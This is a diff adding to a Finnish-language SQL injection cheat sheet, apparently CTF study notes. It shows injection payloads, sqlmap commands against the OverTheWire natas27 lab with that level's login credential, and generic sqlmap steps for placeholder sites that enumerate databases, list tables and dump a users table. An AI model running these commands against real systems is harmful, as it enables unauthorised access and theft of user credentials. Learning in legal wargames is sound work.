@@ -161,7 +161,58 @@ Tämä taulukko kuvaa SQL-injektion testauksen ja hyödyntämisen etenemistä va
 | 4     | 🧪 Muunnelmat             | Eri ehto- ja rakennevariaatiot                                        | `OR 'a'='a'` , `OR 1=1 LIMIT 1` , `OR 1=1#`                          |
 | 5     | 🧱 Rakenneanalyysi        | Testaa montako saraketta, missä kohtaa lause menee rikki              | `ORDER BY 1` , `ORDER BY 2` , sulkujen rikkominen                   |
 | 6     | 🧩 UNION SELECT -hyökkäys | Yhdistä omia valintoja SQL:ään, yritä hakea käyttäjätietoja            | `UNION SELECT 1,2 --` , `UNION SELECT username, password FROM users --` |
-| 7     | 🔄 Automatisointi (sqlmap)| Automatisoi kaikki yllä olevat vaiheet ja hae tietokantatietoja        | `sqlmap -u "http://target?username=*" --dbs`                        |
+| 7     | 🔄 Automatisointi (sqlmap)| Automatisoi kaikki yllä olevat vaiheet ja hae tietokantatietoja        | `sqlmap -u "http://target?username=*" --dbs`
+
+
+Tämä on pieni lunttilappu SQL injektion osuus (sqlmap) kuin tarkistuksena jos löytyy tietokanta:
+
+```
+sqlmap -u "http://natas27.natas.labs.overthewire.org/" \
+--auth-type Basic --auth-cred "natas27:u3RRffXjysjgwFU6b9xa23i6prmUsYne" \
+--data "username=test&password=test" \
+--batch --level=5 --risk=3 --dbs
+```
+
+- jos injkeito löytyy niin lisätään tietokanna nimen: --dbs
+- jos tietokanta löytyy sitten lisätään perään: --tables -D <tietokannan_nimi>
+- ja viimeisenä dumppaus ulos jos löytyy ja lisätään perään: --dump -D <tietokanta> -T users
+
+
+Tämä on yksinkertaisempi komento, mutta yleisellä tarkistuksella jos tarkistaa onko sivuston alla tietokantaa: 
+```
+sqlmap -u "http://example.com/page.php?id=1" --batch --dbs
+```
+
+- URL sisältää GET-parametrin (esim. ?id=1)
+- Palvelin ei vaadi autentikointia
+- Parametri on oikeasti käytössä taustalla SQL-kyselyssä
+- Hyvä kevyt testaus GET-parametrille, mutta ei riitä POST-lomakkeisiin tai suojattuihin sivuihin ja hyvä testauksena, ei välttämättä ehkä suoraan anna vastausta mutta hyvä testinä alkuunkin.
+
+
+
+**muita hyviä testauspolku GET-parametrille** ja toimia hyvin lunttilappuna, mikäli jos löytää tietokantansa: 
+
+1. Kevyt testaus:
+```
+sqlmap -u "http://example.com/page.php?id=1" --batch
+```
+
+2. Syvempi analyysi:
+```
+sqlmap -u "http://example.com/page.php?id=1" --batch --level=5 --risk=3 --dbs
+```
+
+3.Taulujen listaus (jos tietokanta löytyy):
+```
+sqlmap -u "http://example.com/page.php?id=1" --batch -D tietokanta_nimi --tables
+```
+
+Muu Bonus: Parametrien automaattinen haku:
+```
+sqlmap -u "http://example.com/" --forms --crawl=2 --batch
+```
+
+---
 
 ## 📌 Vinkit etenemiseen:
 
